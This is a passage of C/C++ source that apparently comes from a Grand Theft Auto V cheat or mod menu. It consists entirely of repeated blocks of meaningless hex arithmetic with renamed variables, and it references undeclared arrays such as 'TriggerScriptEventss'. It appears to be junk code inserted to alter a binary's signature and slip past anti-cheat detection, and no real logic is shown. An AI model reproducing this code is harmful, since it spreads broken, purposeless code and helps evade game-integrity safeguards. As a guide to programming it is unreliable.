			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (5) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		a = 0.0f;
		b = 0.0f;
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
		TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		Spawn_Struct Spawn;

		if (offset > aaaaaa)
		{
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = ponteiro * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
		offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (matriz[1] > aaaaaa)
		{
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		a = 0.0f;
		b = 0.0f;
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = 0xB2 * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
		matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
		matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		if (matriz[1] > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		a = 0.0f;
		b = 0.0f;
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
		GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
